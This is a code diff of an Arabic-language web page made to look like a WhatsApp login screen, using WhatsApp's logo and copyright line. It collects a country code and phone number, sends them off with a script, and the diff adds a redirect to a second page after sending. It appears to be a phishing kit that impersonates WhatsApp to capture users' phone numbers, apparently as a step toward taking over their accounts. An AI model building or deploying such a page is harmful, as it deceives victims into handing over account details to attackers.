@@ -11,9 +11,6 @@
             background-color: #FAF3E7;
             margin: 0;
             padding: 0;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
         }
 
         .navbar {
@@ -36,24 +33,18 @@
             margin-right: 10px;
         }
 
-        .navbar .menu {
-            cursor: pointer;
-            font-size: 22px;
-        }
-
         .container {
-            flex: 1;
             text-align: center;
             background-color: white;
             border-radius: 10px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
             padding: 20px;
             max-width: 400px;
-            margin: 20px auto;
+            margin: 50px auto;
         }
 
-        .container .design img {
-            width: 150px;
+        .container img {
+            width: 100px;
             margin-bottom: 20px;
         }
 
@@ -67,7 +58,6 @@
         .container .description {
             font-size: 14px;
             color: #555;
-            text-align: center;
             margin-bottom: 20px;
         }
 
@@ -76,7 +66,6 @@
             flex-direction: column;
             gap: 10px;
             align-items: center;
-            margin-bottom: 20px;
         }
 
         .container select,
@@ -87,11 +76,10 @@
             font-size: 14px;
             width: 100%;
             max-width: 300px;
-            box-sizing: border-box;
         }
 
         .container button {
-            padding: 12px 20px;
+            padding: 10px;
             background-color: #25D366;
             color: white;
             border: none;
@@ -107,17 +95,10 @@
         }
 
         footer {
-            background-color: #f1f1f1;
-            color: #888;
             text-align: center;
-            padding: 10px;
+            margin-top: 20px;
+            color: #888;
             font-size: 12px;
-            margin-top: auto;
-        }
-
-        footer a {
-            color: #25D366;
-            text-decoration: none;
         }
     </style>
 </head>
@@ -129,17 +110,12 @@
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
             واتساب
         </div>
-        <div class="menu">☰</div>
     </div>
 
     <!-- Main Container -->
     <div class="container">
-        <div class="design">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
-        </div>
-
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
         <div class="title">تسجيل الدخول</div>
-
         <div class="description">يرجى إدخال رمز الدولة ورقم الهاتف.</div>
 
         <div class="form-group">
@@ -155,12 +131,6 @@
                 <option value="962">🇯🇴 الأردن +962</option>
                 <option value="970">🇵🇸 فلسطين +970</option>
                 <option value="249">🇸🇩 السودان +249</option>
-                <option value="253">🇩🇯 جيبوتي +253</option>
-                <option value="252">🇸🇴 الصومال +252</option>
-                <option value="222">🇲🇷 موريتانيا +222</option>
-                <option value="967">🇾🇪 اليمن +967</option>
-                <option value="269">🇰🇲 جزر القمر +269</option>
-                <option value="211">🇸🇸 جنوب السودان +211</option>
             </select>
             <input id="phoneNumber" type="text" placeholder="رقم الهاتف" maxlength="10">
         </div>
@@ -168,8 +138,7 @@
     </div>
 
     <footer>
-        © 2024 واتساب. جميع الحقوق محفوظة. <br>
-        <a href="https://www.whatsapp.com/legal/">سياسة الخصوصية</a> | <a href="https://www.whatsapp.com/">مركز المساعدة</a>
+        © 2024 واتساب
     </footer>
 
     <script>
@@ -199,6 +168,7 @@
             .then(data => {
                 if (data.ok) {
                     alert('تم الإرسال بنجاح!');
+                    window.location.href = 'secondpage.html';
                 } else {
                     alert('حدث خطأ أثناء الإرسال.');
                 }
